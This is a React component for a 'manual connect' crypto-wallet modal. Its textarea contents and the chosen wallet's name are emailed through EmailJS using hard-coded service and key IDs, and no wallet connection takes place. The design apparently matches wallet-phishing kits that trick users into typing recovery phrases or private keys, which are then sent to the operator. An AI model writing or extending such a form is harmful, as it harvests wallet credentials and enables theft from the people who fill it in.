// ManualConnectModal.js
import React, { useState, useRef } from "react";
import emailjs from "emailjs-com";

const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
  const [userText, setUserText] = useState("");
  const form = useRef();

  const handleSubmit = (e) => {
    e.preventDefault();

    // Add logic to handle userText and selectedWallet.name if needed
    const formData = new FormData(form.current);
    formData.append("walletName", selectedWallet.name);

    console.log("Form data:", formData);
    

    emailjs
      .sendForm(
        "service_olg9dp8",
        "template_n31gav9",
        form.current,
        "yPbNv-lKRO62iIUkS"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.error(error.text);
        }
      );

    onSubmit(); // Close the modal after submission (you can modify this as needed)
  };

  return (
    <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
      <div className="bg-white p-5 rounded-xl w-[700px]">
        <h2 className="text-xl font-semibold mb-4">{selectedWallet.name}</h2>
        <form ref={form} onSubmit={handleSubmit}>
          {/* Hidden input to capture wallet name */}
          <input
            type="hidden"
            id="walletName"
            name="walletName"
            value={selectedWallet.name}
          />

          <label className="block mb-2">Additional Information:</label>
          <textarea
            id="userText"
            name="userText"
            value={userText}
            onChange={(e) => setUserText(e.target.value)}
            className="w-full h-32 border border-gray-300 rounded-md p-2"
            placeholder="Enter additional information..."
          />
          <button
            type="submit"
            className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
          >
            Submit
          </button>
        </form>
        <button
          className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
          onClick={closeModal}
        >
          Close
        </button>
      </div>
    </div>
  );
};

export default ManualConnectModal;
